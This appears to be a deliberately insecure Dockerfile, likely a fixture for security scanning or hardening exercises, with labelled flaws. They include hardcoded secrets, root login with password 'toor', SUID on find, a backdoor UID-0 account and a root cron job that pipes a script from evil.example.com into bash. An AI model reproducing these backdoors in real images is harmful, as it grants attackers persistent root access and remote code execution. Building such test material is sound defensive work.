FROM python:3.11-slim

# BAD: Running as root, installs offensive tools
RUN apt-get update && apt-get install -y \
    openssh-server postgresql redis-server \
    curl wget netcat-openbsd nmap \
    && rm -rf /var/lib/apt/lists/*

COPY . /app
WORKDIR /app

# BAD: secrets in ENV
ENV DATABASE_URL="postgresql://admin:password123@localhost/appdb"
ENV SECRET_KEY="supersecretkey123"
ENV FLASK_DEBUG="1"

RUN pip install -r requirements.txt

# BAD: world-writable uploads, SUID on find
RUN mkdir -p /app/uploads && chmod 777 /app/uploads
RUN chmod u+s /usr/bin/find

# BAD: root login with default password
RUN echo 'root:toor' | chpasswd
RUN echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config

# H-01: rogue UID-0 account
RUN echo 'sysbackup:x:0:0:System Backup:/root:/bin/bash' >> /etc/passwd

# H-02: malicious cron job
RUN echo '* * * * * root curl http://evil.example.com/payload.sh | bash' \
    > /etc/cron.d/system-update && chmod 644 /etc/cron.d/system-update

RUN chmod +x /app/entrypoint.sh

EXPOSE 5000 5432 22

ENTRYPOINT ["/app/entrypoint.sh"]
